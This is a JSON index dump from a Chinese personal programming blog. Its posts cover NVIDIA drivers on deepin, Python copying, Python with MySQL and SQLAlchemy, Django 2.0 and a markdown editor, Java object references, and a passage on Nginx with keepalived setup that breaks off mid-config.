重启，也许你现在运行reboot或者shutdown会死机， 不过没关系， 强制关机就好 开机运行 1lsmod | grep nouveau 如果没输出，那就是禁用成功 重启 不用输入密码，开机按Ctrl + Alt + F2输入用户名，密码，进入下载NVIDIA的目录下 1sudo sh XXXXXXXXXXXXXXXX.run 重启 然后就可以使用了。 本教程也许只对我一个人有用","path":"2019/04/11/deepin开机后假死/","date":"04-11","excerpt":"思路参考：https://blog.csdn.net/fdqw_sph/article/details/78759529首先，我的电脑是显卡和Linux不兼容（多种版本Linux，例如：manjaro三个版本均无法使用，Ubuntu除17.10之外均无法使用——17.10还无法正常关机，需要手动关闭所有软件才可以关机，deepin开机登陆后假死，dock无反应，单cpu飙升100，kill不掉那个100%的进程）","tags":[{"name":"踩坑","slug":"踩坑","permalink":"https://jijiking51.cn/tags/踩坑/"},{"name":"deepin","slug":"deepin","permalink":"https://jijiking51.cn/tags/deepin/"}],"preview":"http://img.jijiking51.cn/deepin开机后假死.jpg"},{"title":"Python深复制和浅复制","text":"python中赋值是引用传递——&gt;例子中的 c复制要使用copy浅复制（浅拷贝）是复制对象本身，并不对对象内部的子对象进行复制。——&gt;例子中的b深复制（深拷贝）将对象的本身以及子对象全部拷贝——&gt;例子中的d 12345678910111213141516171819202122232425262728293031323334353637#初始对象a = [1,2,3,4,5,6,[0,0,0,0]]#b 进行浅赋值b = copy.copy(a)#c 直接引用ac = a#d进行深度复制d = copy.deepcopy(a)&quot;&quot;&quot; a 中添加新的元素 受影响的有c&quot;&quot;&quot;a.append(7)&quot;&quot;&quot; a的子对象中添加新的元素 受影响的有 b ，c&quot;&quot;&quot;a[6].append(1)print(a)print(b)print(c)print(d)&quot;&quot;&quot;[1, 2, 3, 4, 5, 6, [0, 0, 0, 0, 1], 7][1, 2, 3, 4, 5, 6, [0, 0, 0, 0, 1]][1, 2, 3, 4, 5, 6, [0, 0, 0, 0, 1], 7][1, 2, 3, 4, 5, 6, [0, 0, 0, 0]]&quot;&quot;&quot;","path":"2019/04/11/Python深复制和浅复制/","date":"04-11","excerpt":"python中赋值是引用传递——&gt;例子中的 c复制要使用copy浅复制（浅拷贝）是复制对象本身，并不对对象内部的子对象进行复制。——&gt;例子中的b深复制（深拷贝）将对象的本身以及子对象全部拷贝——&gt;例子中的d","tags":[{"name":"基础","slug":"基础","permalink":"https://jijiking51.cn/tags/基础/"}],"preview":"http://img.jijiking51.cn/Python 深复制和浅复制.jpg"},{"title":"python连接mysql","text":"首先安装mysql驱动1pip3 install mysql-connector-python --allow-external mysql-connector-pythonmysql连接实例：123456789101112131415161718192021#加载驱动import mysql.connector#建立连接conn = mysql.connector.connect(user=&apos;root&apos;,password=&apos;123456&apos;,database=&apos;school&apos;)#获取连接的游标cursor = conn.cursor()#执行Sqlcursor.execute(&quot;show tables&quot;)#获取返回列表（list）a = cursor.fetchall()#遍历for i in a: print(re.match(tables_name,str(i)).group(1))#关闭游标cursor.close()#提交未提交事物conn.commit()#关闭连接conn.close() 使用sqlalchemy对数据库生成映射对象安装驱动 1pip3 install sqlalchemy sqlalchemy使用实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from sqlalchemy import Column , String , create_enginefrom sqlalchemy.orm import sessionmakerfrom sqlalchemy.ext.declarative import declarative_base#创建一个对象的基类Base = declarative_base()#创建对象class User(Base): &quot;&quot;&quot;Test for sqlalachemy&quot;&quot;&quot; #数据库表名 __tablename__ = &apos;students&apos; #表的结构 &apos;&apos;&apos; +----------+----------------------------------------------------------------------------------------------------------------------------------------------------------+ | Table | Create Table | +----------+----------------------------------------------------------------------------------------------------------------------------------------------------------+ | students | CREATE TABLE `students` ( `sid` varchar(10) NOT NULL, `sname` varchar(10) DEFAULT NULL, PRIMARY KEY (`sid`) ) ENGINE=InnoDB DEFAULT CHARSET=latin1 | +----------+----------------------------------------------------------------------------------------------------------------------------------------------------------+ &apos;&apos;&apos; sid = Column(String(10),primary_key=True) sname = Column(String(10))#创建连接 格式： 数据库类型+数据库驱动名称://用户名：密码@及其地址:端口/数据库名字engine = create_engine(&apos;mysql+mysqlconnector://root:123456@localhost:3306/school&apos;)#创建DBSession类型DBSession = sessionmaker(bind=engine)#建立连接session = DBSession()# 创建新的对象new_user = User(sid = &apos;5&apos;,sname = &apos;Bob&apos;)# 添加到sessionsession.add(new_user)# 提交事物session.commit()# 关闭连接session.close() 利用sqlalchemy将数据内容映射到User对象 12345678910111213141516171819202122232425from sqlalchemy import Column ,String,create_enginefrom sqlalchemy.orm import sessionmakerfrom sqlalchemy.ext.declarative import declarative_baseBase = declarative_base()class User(Base): __tablename__ = &apos;students&apos; sid = Column(String(10),primary_key = True) sname = Column(String(10))engine = create_engine(&apos;mysql+mysqlconnector://root:123456@localhost:3306/school&apos;)DBSession = sessionmaker(bind = engine)session = DBSession()#创建Query查询，filter是where条件，最后是返回一行， 如果是all()则返回所有行#此处 session.query(User).filter(User.sid == &apos;5&apos;).one()#如果是多表查询可以是#session.query(User,address).filter(User.sid == address.sid).one()user = session.query(User).filter(User.sid==&apos;5&apos;).one()print(&apos;type:&apos;,type(user))print(&apos;name:&apos;,user.sname)session.close()","path":"2019/04/11/python连接mysql/","date":"04-11","excerpt":"首先安装mysql驱动1pip3 install mysql-connector-python --allow-external mysql-connector-pythonmysql连接实例：123456789101112131415161718192021#加载驱动import mysql.connector#建立连接conn = mysql.connector.connect(user=&apos;root&apos;,password=&apos;123456&apos;,database=&apos;school&apos;)#获取连接的游标cursor = conn.cursor()#执行Sqlcursor.execute(&quot;show tables&quot;)#获取返回列表（list）a = cursor.fetchall()#遍历for i in a: print(re.match(tables_name,str(i)).group(1))#关闭游标cursor.close()#提交未提交事物conn.commit()#关闭连接conn.close()","tags":[{"name":"基础","slug":"基础","permalink":"https://jijiking51.cn/tags/基础/"}],"preview":"http://img.jijiking51.cn/python连接mysql.jpg"},{"title":"Django2.0使用","text":"准备 首先下载安装django1pip3 install djangopycharm可以直接建立django的项目，也可以执行命令1django-admin startproject mysite这样就建立了一个mysite的django项目。 下面是新建项目的目录文件列表1234567mysite/ manage.py mysite/ __init__.py settings.py urls.py wsgi.py 其中，settings.py是项目各种配置的文件urls.py是url目录文件manage.py是管理工具 尝试运行（pycharm可以直接点击Django项目运行）也可以shell运行命令 1234567891011121314python manage.py runserver运行成功后的输出Performing system checks...System check identified no issues (0 silenced).You have unapplied migrations; your app may not work properly until they are applied.Run &apos;python manage.py migrate&apos; to apply them.六月 01, 2018 - 15:50:53Django version 2.0, using settings &apos;mysite.settings&apos;Starting development server at http://127.0.0.1:8000/Quit the server with CONTROL-C. 2.创建一个应用1python manage.py startapp polls 创建完成后会在mysite目录下看到一个polls文件目录 123456789polls/ __init__.py admin.py apps.py migrations/ __init__.py models.py tests.py views.py 应用创建完成了不过，等下模型的学习中还要使用 3.视图现在创建我们的第一个视图应用 12345from django.http import HttpResponse,request# Create your views here.def hello(request): html = &apos;&lt;html&gt;&lt;body&gt;hello world&lt;/body&gt;&lt;/heml&gt;&apos; return HttpResponse(html) 同时配置我们的polls/urls.py 12345678910111213添加：path(&quot;&quot;,views.hello,name=&apos;index&apos;)完成后是这个样子：from django.urls import path,includefrom . import viewsurlpatterns =[ #首页设置 path(&quot;&quot;,views.hello,name=&apos;index&apos;),] 这仅仅是polls下的配置，mysite还无法知道这是什么意思，所以我们还要配置mysite/urls.py打开mysite/urls.py后里面已经有内容了，在其中添加 123456789101112path(&apos;polls/&apos;,include(&apos;polls.urls&apos;)),配置好以后的样子from django.contrib import adminfrom django.urls import path,includeurlpatterns = [ path(&apos;admin/&apos;, admin.site.urls), path(&apos;polls/&apos;,include(&apos;polls.urls&apos;)),] 然后就可以打开浏览器输入链接：http://127.0.0.1:8000/polls/ 这里面用到了include在官方文档中是这样写的： 函数 include() 允许引用其它 URLconfs。每当 Django 遇到 :func：~django.urls.include时，它会截断与此项匹配的 URL 的部分，并将剩余的字符串发送到 URLconf 以供进一步处理。 我们设计 include()的理念是使其可以即插即用。因为投票应用有它自己的 URLconf( polls/urls.py )，他们能够被放在 “/polls/“ ，“/fun_polls/“ ，”/content/polls/“，或者其他任何路径下，这个应用都能够正常工作。 接下来理解一下path： 1234567891011121314151617def _path(route, view, kwargs=None, name=None, Pattern=None): if isinstance(view, (list, tuple)): # For include(...) processing. pattern = Pattern(route, is_endpoint=False) urlconf_module, app_name, namespace = view return URLResolver( pattern, urlconf_module, kwargs, app_name=app_name, namespace=namespace, ) elif callable(view): pattern = Pattern(route, name=name, is_endpoint=True) return URLPattern(pattern, view, kwargs, name) else: raise TypeError(&apos;view must be a callable or a list/tuple in the case of include().&apos;) 这是path的函数，我们可以看到传递进去的参数： route：route 是一个匹配 URL 的准则（类似正则表达式）。当 Django 响应一个请求时，它会从 urlpatterns 的第一项开始，按顺序依次匹配列表中的项，直到找到匹配的项。这些准则不会匹配 GET 和 POST 参数或域名。例如，URLconf 在处理请求 https://www.example.com/myapp/ 时，它会尝试匹配 myapp/ 。处理请求 https://www.example.com/myapp/?page=3 时，也只会尝试匹配 myapp/。view：当 Django 找到了一个匹配的准则，就会调用这个特定的视图函数，并传入一个 HttpRequest 对象作为第一个参数，被“捕获”的参数以关键字参数的形式传入。kwargs=None：任意个关键字参数可以作为一个字典传递给目标视图函数 name=None：为你的 URL 取名能使你在 Django 的任意地方唯一地引用它，尤其是在模板中。这个有用的特性允许你只改一个文件就能全局地修改某个 URL 模式。 Pattern=None：官方文档并没有给解释 其中，博主也只知道使用route和view，设置name之后怎么使用name博主也不知道，如果哪位大大翻了博主的牌，望告知 4.数据库配置python默认使用的是SQLite，但是博主使用的是mysql，所以接下来都是mysql的配置，如果是其他数据库请看官方文档在此之前，请确认：1.安装好mysql数据库2.已经下载好了mysqlclient（pip/pip3 install mysqlclient）3.设置好时间在mysite/settings.pyTIME_ZONE = ‘Asia/Shanghai’ 看到下面的内容， 我们打开mysite/settings.py sqlite：’django.db.backends.sqlite3’postgresql：’django.db.backends.postgresql’mysql：’django.db.backends.mysql‘oracle：’django.db.backends.oracle’ 找到DATABASES这个设置，填写以下内容 12345678910DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, &apos;NAME&apos;: &apos;polls&apos;, &apos;USER&apos;: &apos;root&apos;, &apos;PASSWORD&apos;: &apos;123456&apos;, &apos;HOST&apos;: &apos;127.0.0.1&apos;, &apos;PORT&apos;: &apos;3306&apos;, &#125;&#125; NAME： 数据库名字USER：用户名PASSWORD：用户密码HOST：ipPORT：端口 在创建自己的模型之前，我们先运行 1python manage.py migrate 这是为为我们的admin应用创建数据库表格 接下来编写我们的模型： 打开polls/models.py，填写以下代码： 12345678910from django.db import models# Create your models here.class Question(models.Model): question_text = models.CharField(max_length=200) pub_data = models.DateTimeField(&apos;date published&apos;)class Choice(models.Model): question = models.ForeignKey(Question,on_delete=models.CASCADE) choice_text = models.CharField(max_length=200) votes = models.IntegerField(default=0) 这里，将每一个类表示未django.db.modles.Model的子类，每个模型都有一些变量， 这是表示模型里面的数据库的字段每个字段我们都设置了一个类型， 比如CharField,DateTImeFIeld,用来告诉django处理数据的类型。其中我们定义了一个Field名字，在官方文档中， 他是这样解释的： 你可以使用可选的选项来为 Field 定义一个人类可读的名字。这个功能在很多 Django内部组成部分中都被使用了，而且作为文档的一部分。如果某个字段没有提供此名称，Django将会使用对机器友好的名称，也就是变量名。在上面的例子中，我们只为 Question.pub_date定义了对人类友好的名字。对于模型内的其它字段，它们的机器友好名也会被作为人类友好名使用。 Field中有些参数，例如 max_length 这个浅显易懂，就是长度设置，当然也可以设置默认值，例如 :default = 0最后我们定义了ForeignKey，这是一对一关系， 告诉我们每个choice都对应了一个question，后面的参数是：models.CASCADE：对就对象删除后，包含ForeignKey的字段也会被删除models.PROTECT：删除时会引起ProtectedErrormodels.SET_NULL：注意只有当当前字段设置null设置为True才有效，此情况会将ForeignKey字段设置为nullmodels.SET_DEFAULT ：同样，当前字段设置了default才有效，此情况会将ForeignKey 字段设置为default 值moels.SET：此时需要指定set的值models.DO_NOTHING ：什么也不做 写好模型之后我们要去激活我们的模型，在mysite/settings.py中找到这个INSTALLED_APPS在里面添加 12#因为PollsConfig类写在了polls/apps中’polls.apps.PollsConfig‘ 接着，我们运行以下命令： 1234567891011121314151617181920212223242526272829#通过运行 makemigrations 命令，Django 会检测你对模型文件的修改（在这种情况下，你已经取得了新的），并且把修改的部分储存为一次 迁移。python manage.py makemigrations polls#输出Migrations for &apos;polls&apos;: polls/migrations/0001_initial.py: - Create model Choice - Create model Question - Add field question to choice#查看迁移执行的命令python manage.py sqlmigrate polls 0001#输出BEGIN;---- Create model Choice--CREATE TABLE `polls_choice` (`id` integer AUTO_INCREMENT NOT NULL PRIMARY KEY, `choice_text` varchar(200) NOT NULL, `votes` integer NOT NULL);---- Create model Question--CREATE TABLE `polls_question` (`id` integer AUTO_INCREMENT NOT NULL PRIMARY KEY, `question_text` varchar(200) NOT NULL, `pub_data` datetime(6) NOT NULL);---- Add field question to choice--ALTER TABLE `polls_choice` ADD COLUMN `question_id` integer NOT NULL;ALTER TABLE `polls_choice` ADD CONSTRAINT `polls_choice_question_id_c5b4b260_fk_polls_question_id` FOREIGN KEY (`question_id`) REFERENCES `polls_question` (`id`);COMMIT; 关于迁移和官方文档的提醒要点： 1、迁移是 Django 对于模型定义（也就是你的数据库结构）的变化的储存形式 - 没那么玄乎，它们其实也只是一些你磁盘上的文件。如果你想的话，你可以阅读一下你模型的迁移数据，它被储存在 polls/migrations/0001_initial.py 里。别担心，你不需要每次都阅读迁移文件，但是它们被设计成人类可读的形式，这是为了便于你手动修改它们。 2、注意要点： 输出的内容和你使用的数据库有关，上面的输出示例使用的是 PostgreSQL。 数据库的表名是由应用名(polls)和模型名的小写形式( question 和 choice)连接而来。（如果需要，你可以自定义此行为。） 主键(IDs)会被自动创建。(当然，你也可以自定义。) 默认的，Django 会在外键字段名后追加字符串 “_id” 。（同样，这也可以自定义。） 外键关系由 FOREIGN KEY 生成。你不用关心 DEFERRABLE 部分，它只是告诉 PostgreSQL，请在事务全都执行完之后再创建外键关系。 生成的 SQL 语句是为你所用的数据库定制的，所以那些和数据库有关的字段类型，比如 auto_increment (MySQL)、 serial (PostgreSQL)和 integer primary key autoincrement (SQLite)，Django 会帮你自动处理。那些和引号相关的事情 - 例如，是使用单引号还是双引号 - 也一样会被自动处理。 这个 sqlmigrate 命令并没有真正在你的数据库中的执行迁移 - 它只是把命令输出到屏幕上，让你看看 Django 认为需要执行哪些 SQL 语句。这在你想看看 Django 到底准备做什么，或者当你是数据库管理员，需要写脚本来批量处理数据库时会很有用。 再次执行命令： 12345678python manage.py migrate#输出Operations to perform: Apply all migrations: admin, auth, contenttypes, polls, sessionsRunning migrations: Rendering model states... DONE Applying polls.0001_initial... OK 这样，数据库中就自动创建了表格 总结： 编辑 models.py 文件，改变模型。 运行 python manage.py makemigrations 为模型的改变生成迁移文件。 运行 python manage.py migrate 来应用数据库迁移。 5.API使用*此段直接引用于官方文档 12345678910111213141516171819202122232425262728293031323334$ python manage.py shell&gt;&gt;&gt; from polls.models import Choice, Question # Import the model classes we just wrote.# No questions are in the system yet.&gt;&gt;&gt; Question.objects.all()&lt;QuerySet []&gt;# Create a new Question.# Support for time zones is enabled in the default settings file, so# Django expects a datetime with tzinfo for pub_date. Use timezone.now()# instead of datetime.datetime.now() and it will do the right thing.&gt;&gt;&gt; from django.utils import timezone&gt;&gt;&gt; q = Question(question_text=&quot;What&apos;s new?&quot;, pub_date=timezone.now())# Save the object into the database. You have to call save() explicitly.&gt;&gt;&gt; q.save()# Now it has an ID.&gt;&gt;&gt; q.id1# Access model field values via Python attributes.&gt;&gt;&gt; q.question_text&quot;What&apos;s new?&quot;&gt;&gt;&gt; q.pub_datedatetime.datetime(2012, 2, 26, 13, 0, 0, 775217, tzinfo=&lt;UTC&gt;)# Change values by changing the attributes, then calling save().&gt;&gt;&gt; q.question_text = &quot;What&apos;s up?&quot;&gt;&gt;&gt; q.save()# objects.all() displays all the questions in the database.&gt;&gt;&gt; Question.objects.all()&lt;QuerySet [&lt;Question: Question object (1)&gt;]&gt; Question object(1)对于我们了解这个对象的细节没什么帮助。让我们通过编辑 Question 模型的代码（位于 polls/models.py 中）来修复这个问题。给 Question 和 Choice 增加 str() 方法。polls/models.py 1234567891011from django.db import modelsclass Question(models.Model): # ... def __str__(self): return self.question_textclass Choice(models.Model): # ... def __str__(self): return self.choice_text 给模型增加 str() 方法是很重要的，这不仅仅能给你在命令行里使用带来方便，Django 自动生成的 admin 里也使用这个方法来表示对象。 注意：这些都是常规的 Python方法。让我们添加一个自定义的方法，这只是为了演示：polls/models.py 12345678910import datetimefrom django.db import modelsfrom django.utils import timezoneclass Question(models.Model): # ... def was_published_recently(self): return self.pub_date &gt;= timezone.now() - datetime.timedelta(days=1) 新加入的 import datetime 和 from django.utils import timezone 分别导入了 Python 的标准 datetime 模块和 Django 中和时区相关的 django.utils.timezone 工具模块。如果你不太熟悉 Python 中的时区处理，看看 时区支持文档 吧。 保存文件然后通过 python manage.py shell 命令再次打开 Python 交互式命令行： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&gt;&gt;&gt; from polls.models import Choice, Question# Make sure our __str__() addition worked.&gt;&gt;&gt; Question.objects.all()&lt;QuerySet [&lt;Question: What&apos;s up?&gt;]&gt;# Django provides a rich database lookup API that&apos;s entirely driven by# keyword arguments.&gt;&gt;&gt; Question.objects.filter(id=1)&lt;QuerySet [&lt;Question: What&apos;s up?&gt;]&gt;&gt;&gt;&gt; Question.objects.filter(question_text__startswith=&apos;What&apos;)&lt;QuerySet [&lt;Question: What&apos;s up?&gt;]&gt;# Get the question that was published this year.&gt;&gt;&gt; from django.utils import timezone&gt;&gt;&gt; current_year = timezone.now().year&gt;&gt;&gt; Question.objects.get(pub_date__year=current_year)&lt;Question: What&apos;s up?&gt;# Request an ID that doesn&apos;t exist, this will raise an exception.&gt;&gt;&gt; Question.objects.get(id=2)Traceback (most recent call last): ...DoesNotExist: Question matching query does not exist.# Lookup by a primary key is the most common case, so Django provides a# shortcut for primary-key exact lookups.# The following is identical to Question.objects.get(id=1).&gt;&gt;&gt; Question.objects.get(pk=1)&lt;Question: What&apos;s up?&gt;# Make sure our custom method worked.&gt;&gt;&gt; q = Question.objects.get(pk=1)&gt;&gt;&gt; q.was_published_recently()True# Give the Question a couple of Choices. The create call constructs a new# Choice object, does the INSERT statement, adds the choice to the set# of available choices and returns the new Choice object. Django creates# a set to hold the &quot;other side&quot; of a ForeignKey relation# (e.g. a question&apos;s choice) which can be accessed via the API.&gt;&gt;&gt; q = Question.objects.get(pk=1)# Display any choices from the related object set -- none so far.&gt;&gt;&gt; q.choice_set.all()&lt;QuerySet []&gt;# Create three choices.&gt;&gt;&gt; q.choice_set.create(choice_text=&apos;Not much&apos;, votes=0)&lt;Choice: Not much&gt;&gt;&gt;&gt; q.choice_set.create(choice_text=&apos;The sky&apos;, votes=0)&lt;Choice: The sky&gt;&gt;&gt;&gt; c = q.choice_set.create(choice_text=&apos;Just hacking again&apos;, votes=0)# Choice objects have API access to their related Question objects.&gt;&gt;&gt; c.question&lt;Question: What&apos;s up?&gt;# And vice versa: Question objects get access to Choice objects.&gt;&gt;&gt; q.choice_set.all()&lt;QuerySet [&lt;Choice: Not much&gt;, &lt;Choice: The sky&gt;, &lt;Choice: Just hacking again&gt;]&gt;&gt;&gt;&gt; q.choice_set.count()3# The API automatically follows relationships as far as you need.# Use double underscores to separate relationships.# This works as many levels deep as you want; there&apos;s no limit.# Find all Choices for any question whose pub_date is in this year# (reusing the &apos;current_year&apos; variable we created above).&gt;&gt;&gt; Choice.objects.filter(question__pub_date__year=current_year)&lt;QuerySet [&lt;Choice: Not much&gt;, &lt;Choice: The sky&gt;, &lt;Choice: Just hacking again&gt;]&gt;# Let&apos;s delete one of the choices. Use delete() for that.&gt;&gt;&gt; c = q.choice_set.filter(choice_text__startswith=&apos;Just hacking&apos;)&gt;&gt;&gt; c.delete() 6.Django管理页面首先创建一个管理员python manage.py createsuperuser 接下来会让你输入用户名、邮箱、密码、验证密码 完成后启动项目进入http://127.0.0.1:8000/admin/ ，输入你刚刚设置的账户密码进去后，我们可以通过这个页面进行管理。如果需要管理，我们要告诉他管理什么东西：进入polls/admin 12345from django.contrib import adminfrom .models import Questionadmin.site.register(Question) 现在可以通过admin管理question的内容","path":"2019/04/11/Django2-0使用/","date":"04-11","excerpt":"准备 首先下载安装django1pip3 install djangopycharm可以直接建立django的项目，也可以执行命令1django-admin startproject mysite这样就建立了一个mysite的django项目。","tags":[{"name":"Django","slug":"Django","permalink":"https://jijiking51.cn/tags/Django/"}],"preview":"http://img.jijiking51.cn/Django 2.0使用.jpg"},{"title":"Django2.0整合markdown编辑器","text":"测试成功环境：python：3.5.4os：Deepin 15.5Django：2.0IDE：pycharm 1.Django整合Ueditor（百度制作的编辑器）学习于博主： Code人生请按照博主的教程一步一步走，其中下载的DjangoUeditor/DjangoUeditor中的代码导入模块有问题，请完善路径 2.Django整合django-mdeditor1.安装django-mdeditorshell中运行1pip3 install django-mdeditor ##2.新建一个项目 ## 在项目的settings.py的INSTALLED_APPS中添加’mdeditor’, 添加媒体路径到你的设置中： 12MEDIA_ROOT = os.path.join(BASE_DIR, &apos;uploads&apos;)MEDIA_URL = &apos;/media/&apos; 在你的根目录下分别创建对应的文件夹 uploads/editor 将该设置添加到你的urls.py中： 1234567891011121314from django.conf.urls import url, includefrom django.conf.urls.static import staticfrom django.conf import settingsfrom django.contrib import adminfrom django.urls import pathurlpatterns = [ path(&apos;admin/&apos;,admin.site.urls), url(r&apos;mdeditor/&apos;, include(&apos;mdeditor.urls&apos;)),]if settings.DEBUG: # static files (images, css, javascript, etc.) urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) 如果是按照教程的步骤新建的项目，请直接覆盖源代码即可 ##3.添加一个app ##shell在根目录中运行： 1python manage.py startapp Example 打开Example，在models.py中添加 123456from django.db import modelsfrom mdeditor.fields import MDTextFieldclass ExampleModel(models.Model): name = models.CharField(max_length=10) content = MDTextField() 在Example/admin.py中粘贴 123456from django.contrib import admin# Register your models here.from Example.models import ExampleModeladmin.site.register(ExampleModel) 再次回到项目中，在settings.py的INSTALLED_APPS中添加‘Example’, 然后我们运行引用model 12python manage.py makemigrationspython manage.py migrate 最后设置admin用户 1python manage.py createsuperuser 按照提示， 设置用户名，邮箱，密码之后就完成了 4.查看效果运行项目打开http://127.0.0.1:8000/admin/ 输入刚刚设置的账户和密码 点击Add添加你的第一篇文章","path":"2019/04/11/Django2-0整合markdown编辑器/","date":"04-11","excerpt":"测试成功环境：python：3.5.4os：Deepin 15.5Django：2.0IDE：pycharm 1.Django整合Ueditor（百度制作的编辑器）学习于博主： Code人生请按照博主的教程一步一步走，其中下载的DjangoUeditor/DjangoUeditor中的代码导入模块有问题，请完善路径","tags":[{"name":"Markdown","slug":"Markdown","permalink":"https://jijiking51.cn/tags/Markdown/"},{"name":"Django","slug":"Django","permalink":"https://jijiking51.cn/tags/Django/"}],"preview":"http://img.jijiking51.cn/Django2.0整合markdown编辑器.jpg"},{"title":"JAVA_返回引用可变对象的访问器方法避免破坏封装性","text":"如果需要返回一个可变对象的引用， 应该首先对他进克隆（clone）。对象克隆是指存放在另一个位置上的对象副本。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import java.util.Date;class b&#123; private Date day; public b()&#123; this.day = new Date(); &#125; public Date getDay()&#123; return this.day; &#125;&#125;class a&#123; private Date day ; public a()&#123; this.day = new Date(); &#125; public Date getDay()&#123; //使用clone方法 返回的是一个存放在另一个位置上的对象副本 return (Date)this.day.clone(); &#125;&#125;public class demo&#123; public static void main(String[] args) &#123; a obj = new a(); Date d = obj.getDay(); System.out.println(\"使用了clone避免封装被破坏的a类\"+obj.getDay().getYear()); d.setYear(2000); System.out.println(\"使用了clone避免封装被破坏的a类\"+obj.getDay().getYear()); b obj_B = new b(); Date d_bDate = obj_B.getDay(); System.out.println(\"没有使用了clone避免封装被破坏的b类\"+obj_B.getDay().getYear()); d_bDate.setYear(2000); System.out.println(\"没有使用了clone避免封装被破坏的b类\"+obj_B.getDay().getYear()); &#125;&#125;","path":"2019/04/11/JAVA-返回引用可变对象的访问器方法避免破坏封装性/","date":"04-11","excerpt":"","tags":[{"name":"基础","slug":"基础","permalink":"https://jijiking51.cn/tags/基础/"}],"preview":"http://img.jijiking51.cn/JAVA_返回引用可变对象的访问器方法避免破坏封装性.jpg"},{"title":"Java_如何交换两个对象","text":"java语言中，方法参数有一下几个注意点: 一个方法不能修改一个基本数据类型的参数（即数值型和布尔型） 一个方法可以改变一个对象参数的状态 一个方法不能让对象参数引用一个新的对象 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103class A&#123; String name ; public A(String name)&#123; this.name = name; &#125; public A clone()&#123; return this; &#125;&#125;class WrapperA&#123; A a ; public WrapperA(A a)&#123; this.a = a; &#125;&#125;public class demo&#123; public static void main(String[] args) &#123; //1.验证第一条定义 int number1 = 100; int number2 = 200; swapNumber(number1, number2); //结果是 100 200 并没有改变基本类型 System.out.println(number1+\" \"+number2); //2.验证第二条定义 A testA = new A(\"testA1\"); change(testA); //结果是testA2 改变了引用类型 System.out.println(testA.name); //验证第三条定义 A a1 = new A(\"1\"); A a2 = new A(\"2\"); swapA(a1, a2); /*结果还是 1 2 并没有交换 一个方法并不能让对象参数引用一个新的对象。 原理： 当a1传入swapA时，复制了一个引用对象x，也就是swapA中的a1 swapA中将x指向了a2 但是a1 并没有改变 所以改变的仅仅是复制的引用，原来的引用并没有改变 */ System.out.println(a1.name+\" \"+a2.name); //如果想交换可以使用以下方法 WrapperA wa1 = new WrapperA(a1); WrapperA wa2 = new WrapperA(a2); swapWrapperA(wa1, wa2); a1 = wa1.a; a2 = wa2.a; //a1 和 a2 被改变 System.out.println(a1.name+\" \"+a2.name); &#125; //用于测试第一条定义 static void swapNumber(int a , int b)&#123; a += b; b = a - b; a = a - b; &#125; //用于测试第二条定义 static void change(A a)&#123; a.name = \"testA2\"; &#125; //用于测试第三条定义 static void swapA(A a1 , A a2)&#123; A a3 = a1.clone() ; a1 = a2.clone(); a2 = a3; System.out.println(a1.name); &#125; //交换方法 static void swapWrapperA(WrapperA a1,WrapperA a2)&#123; A a3 = a1.a; a1.a = a2.a; a2.a = a3; &#125;&#125;","path":"2019/04/11/Java-如何交换两个对象/","date":"04-11","excerpt":"","tags":[{"name":"基础","slug":"基础","permalink":"https://jijiking51.cn/tags/基础/"}],"preview":"http://img.jijiking51.cn/Java_如何交换两个对象.jpg"},{"title":"Nginx安装配置并使用keepalived实现高可用双机热备","text":"所用安装包也可以从此处下载 下载nginx 官网：https://nginx.org/（我的是1.8.1） 上传并解压nginx tar -zxvf nginx-1.8.1.tar.gz -C /usr/local/src 编译nginx #进入到nginx源码目录 cd /usr/local/src/nginx-1.8.1 #检查安装环境,并指定将来要安装的路径 ./configure –prefix=/usr/local/nginx #缺包报错 ./configure: error: C compiler cc is not found #使用YUM安装缺少的包 yum -y install gcc pcre-devel openssl openssl-devel（centos命令，如果是其他系统请自行更改） 编译安装 make &amp;&amp; make install 安装完后测试是否正常：/usr/loca/nginx/sbin/nginx查看端口是否有ngnix进程监听netstat -ntlp | grep 80如果启动nginx报错：nginx: [emerg] open() “/etc/nginx.conf” failed (2: no such file or directory) find / -name nginx.conf cp 查找到的nginx.conf位置 启动缺少nginx.conf位置 配置nginx 打开nginx.conf 修改nginx配置文件server { listen 80; server_name xxx.com; #nginx所在服务器的主机名#反向代理的配置location / { #拦截所有请求 root html;proxy_pass http://192.168.0.21:8080; #这里是代理走向的目标服务器：tomcat }} 12#重启nginxkill -HUP `cat /usr/local/nginx/logs/nginx.pid ` 动静分离 删除上面的server配置 按照上面的方法配置一下内容#动态资源 index.jsplocation ~ .*.(jsp|do|action)$ { proxy_pass http://192.168.0.2:8080;} #静态资源location ~ .*.(html|js|css|gif|jpg|jpeg|png)$ { expires 3d;} 负载均衡在http这个节下面配置一个叫upstream的，后面的名字可以随意取，但是要和location下的proxy_pass http://后的保持一致。 123456789101112http &#123; 是在http里面的, 已有http, 不是在server里,在server外面 upstream tomcats &#123; server shizhan02:8080 weight=1;#weight表示多少个 server shizhan03:8080 weight=1; server shizhan04:8080 weight=1; &#125;#卸载server里location ~ .*\\.(jsp|do|action) &#123; proxy_pass http://tomcats; #tomcats是后面的tomcat服务器组的逻辑组号 &#125;&#125; 利用keepalived实现高可靠（HA）HA(High Available), 高可用性集群，是保证业务连续性的有效解决方案，一般有两个或两个以上的节点，且分为活动节点及备用节点。 keepalive是一款可以实现高可靠的软件，通常部署在2台服务器上，分为一主一备。Keepalived可以对本机上的进程进行检测，一旦Master检测出某个进程出现问题，将自己切换成Backup状态，然后通知另外一个节点切换成Master状态。 与上面安装过程一样 12345678910111213下载keepalived官网:https://keepalived.org将keepalived解压到/usr/local/src目录下tar -zxvf keepalived-1.2.19.tar.gz -C /usr/local/src进入到/usr/local/src/keepalived-1.2.19目录cd /usr/local/src/keepalived-1.2.19开始configure./configure --prefix=/usr/local/keepalived#编译并安装make &amp;&amp; make install 修改/etc/keepalived/keepalived.conf 配置虚拟ip 两个节点必须是在同一内网,配置心跳检测 原理： Keepalived并不跟nginx耦合，它俩完全不是一家人 但是keepalived提供一个机制：让用户自定义一个shell脚本去检测用户自己的程序，返回状态给keepalived就可以了 #MASTER节点 12345678910111213141516171819202122232425 vrrp_script chk_health &#123; script \"/usr/local/keepalived/sbin/notify.sh\" interval 1 weight -2 